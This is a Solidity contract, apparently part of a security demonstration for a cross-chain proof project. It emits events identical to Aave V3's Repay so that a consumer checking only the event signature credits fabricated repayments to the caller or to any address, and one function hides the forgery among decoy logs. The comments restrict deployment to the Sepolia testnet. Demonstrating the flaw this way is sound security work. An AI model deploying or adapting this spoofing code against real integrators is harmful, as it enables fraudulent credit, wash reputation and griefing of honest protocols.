// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title SpoofEmitter
/// @notice An adversarial artifact. Emits an event byte-identical to Aave V3's
///         `Repay`, from a contract that has nothing to do with Aave.
///
/// @dev THIS CONTRACT IS THE ATTACK. It is shipped so the S2 claim can be
///      performed rather than asserted.
///
///      Nothing here is forged in the cryptographic sense. The transaction
///      really executes. The log really is written. `topic0` really does equal
///      `keccak256("Repay(address,address,address,uint256,bool)")`. The block
///      really is part of the source chain's canonical history. An Attestcoin
///      proof over this event is COMPLETELY VALID and will verify against the
///      Block Prover precompile without complaint.
///
///      That is the entire point. The precompile answers "was this transaction
///      included in a block on this chain?" It does not answer "did the
///      contract that emitted this log have any right to emit it?" A consumer
///      that checks only the event signature will read this as a million-dollar
///      Aave repayment by whoever calls it.
///
/// @dev DEPLOYMENT BOUNDARY -- READ BEFORE DEPLOYING.
///
///      Deploy to ETHEREUM SEPOLIA ONLY. Never to Ethereum mainnet, and never
///      to any chain whose logs a third party underwrites against.
///
///      A mainnet contract whose only purpose is emitting convincing fake Aave
///      events is a live artifact built to deceive anyone else reading mainnet
///      logs -- including honest integrators who have never heard of this
///      project. The vulnerability class is not chain-specific: `topic0` is a
///      hash of the signature string and is identical on every EVM chain, so
///      demonstrating on Sepolia loses nothing. Using Sepolia (`chainKey 1`)
///      for the attack while the honest path proves Ethereum (`chainKey 3`)
///      also exercises both key-space values in one submission.
contract SpoofEmitter {
    /// @dev Byte-identical to Aave V3 Pool's Repay. Same name, same parameter
    ///      types, same indexed positions -- therefore the same topic0 and the
    ///      same topic layout. Nothing distinguishes this log from a genuine
    ///      one except the address it was emitted from.
    event Repay(
        address indexed reserve, address indexed user, address indexed repayer, uint256 amount, bool useATokens
    );

    /// @notice Mint a repayment that never happened.
    /// @param reserve The token to name in the fabricated repayment.
    /// @param amount  The size of the fabricated repayment.
    /// @dev `user` is the caller, so the attacker credits themselves. In the
    ///      registry's source configuration `subjectTopicIndex = 2`, which is
    ///      `user` -- so this is the field a naive consumer reads as "who did
    ///      this".
    function mintHistory(address reserve, uint256 amount) external {
        emit Repay(reserve, msg.sender, msg.sender, amount, false);
    }

    /// @notice Credit an arbitrary address rather than the caller.
    /// @dev Shows the attack is not limited to self-dealing: standing can be
    ///      manufactured for any address, including one the attacker does not
    ///      control, which makes griefing and wash-reputation both possible.
    function mintHistoryFor(address reserve, address user, uint256 amount) external {
        emit Repay(reserve, user, msg.sender, amount, false);
    }

    /// @notice Emit the forged log alongside decoy logs.
    /// @dev The earlier scan-for-first-match implementation in SourceValidator
    ///      would take whichever qualifying log appeared first. Burying the
    ///      forgery among other logs is the natural evasion against a validator
    ///      that scans rather than indexes.
    function mintHistoryBuried(address reserve, uint256 amount) external {
        emit Repay(reserve, address(0xdead), msg.sender, 1, false);
        emit Repay(reserve, msg.sender, msg.sender, amount, false);
    }
}
